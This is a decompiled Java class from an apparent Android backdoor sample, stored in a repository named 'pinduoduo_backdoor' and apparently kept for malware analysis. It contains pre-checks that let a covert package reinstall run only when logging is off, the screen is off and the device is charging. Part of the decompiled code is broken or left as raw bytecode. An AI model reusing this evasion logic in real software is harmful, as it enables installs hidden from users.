package com.google.android.sd.biz_dynamic_dex.base;

import android.content.Context;
import java.util.HashMap;
import java.util.Map;
import org.json.JSONArray;

public abstract class ReinstallCmdExecutor extends DynamicCmdExecutor {
  private static final Map<String, Integer> clientStatus = new HashMap<String, Integer>();
  
  private void updateClientStatus(Context paramContext) {
    Map<String, Integer> map = clientStatus;
    boolean bool = DynamicUtils.isScreenOff(paramContext);
    byte b2 = 2;
    if (bool) {
      b1 = 2;
    } else {
      b1 = 1;
    } 
    map.put("screen", Integer.valueOf(b1));
    byte b1 = b2;
    if (DynamicUtils.isCharging(paramContext))
      b1 = 1; 
    map.put("charge", Integer.valueOf(b1));
  }
  
  public String preCheck(Context paramContext, String paramString, JSONArray paramJSONArray) {
    // Byte code:
    //   0: aload_1
    //   1: invokestatic isSystemLogging : (Landroid/content/Context;)Z
    //   4: ifeq -> 10
    //   7: ldc 'system_logging'
    //   9: areturn
    //   10: aload_2
    //   11: invokestatic isEmpty : (Ljava/lang/CharSequence;)Z
    //   14: ifeq -> 20
    //   17: ldc 'no_pkg'
    //   19: areturn
    //   20: iconst_0
    //   21: istore #6
    //   23: aload_1
    //   24: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
    //   27: aload_2
    //   28: iconst_0
    //   29: invokevirtual getPackageInfo : (Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    //   32: ifnull -> 38
    //   35: ldc 'already_exist'
    //   37: areturn
    //   38: aload_3
    //   39: ifnonnull -> 45
    //   42: ldc 'condition_empty'
    //   44: areturn
    //   45: aload_3
    //   46: invokevirtual length : ()I
    //   49: ifle -> 178
    //   52: aload_0
    //   53: aload_1
    //   54: invokespecial updateClientStatus : (Landroid/content/Context;)V
    //   57: iconst_0
    //   58: istore #4
    //   60: iload #6
    //   62: istore #5
    //   64: iload #4
    //   66: aload_3
    //   67: invokevirtual length : ()I
    //   70: if_icmpge -> 140
    //   73: aload_3
    //   74: iload #4
    //   76: invokevirtual optJSONObject : (I)Lorg/json/JSONObject;
    //   79: astore_1
    //   80: aload_1
    //   81: invokevirtual keys : ()Ljava/util/Iterator;
    //   84: astore_2
    //   85: aload_2
    //   86: invokeinterface hasNext : ()Z
    //   91: ifeq -> 184
    //   94: aload_2
    //   95: invokeinterface next : ()Ljava/lang/Object;
    //   100: checkcast java/lang/String
    //   103: astore #7
    //   105: aload_1
    //   106: aload #7
    //   108: invokevirtual optInt : (Ljava/lang/String;)I
    //   111: istore #5
    //   113: getstatic com/google/android/sd/biz_dynamic_dex/base/ReinstallCmdExecutor.clientStatus : Ljava/util/Map;
    //   116: aload #7
    //   118: invokeinterface get : (Ljava/lang/Object;)Ljava/lang/Object;
    //   123: iload #5
    //   125: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   128: invokestatic equals : (Ljava/lang/Object;Ljava/lang/Object;)Z
    //   131: ifne -> 85
    //   134: iconst_0
    //   135: istore #5
    //   137: goto -> 187
    //   140: iload #5
    //   142: ifne -> 178
    //   145: ldc 'client_status_fail'
    //   147: areturn
    //   148: astore_1
    //   149: new java/lang/StringBuilder
    //   152: dup
    //   153: invokespecial <init> : ()V
    //   156: astore_2
    //   157: aload_2
    //   158: ldc 'pre check error: '
    //   160: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   163: pop
    //   164: aload_2
    //   165: aload_1
    //   166: invokevirtual getMessage : ()Ljava/lang/String;
    //   169: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   172: pop
    //   173: aload_2
    //   174: invokevirtual toString : ()Ljava/lang/String;
    //   177: areturn
    //   178: aconst_null
    //   179: areturn
    //   180: astore_2
    //   181: goto -> 38
    //   184: iconst_1
    //   185: istore #5
    //   187: iload #5
    //   189: ifeq -> 198
    //   192: iconst_1
    //   193: istore #5
    //   195: goto -> 140
    //   198: iload #4
    //   200: iconst_1
    //   201: iadd
    //   202: istore #4
    //   204: goto -> 60
    // Exception table:
    //   from	to	target	type
    //   23	35	180	finally
    //   52	57	148	java/lang/Exception
    //   64	85	148	java/lang/Exception
    //   85	134	148	java/lang/Exception
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\da60112a4b2848adba2ac11f412cccc7-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\ReinstallCmdExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */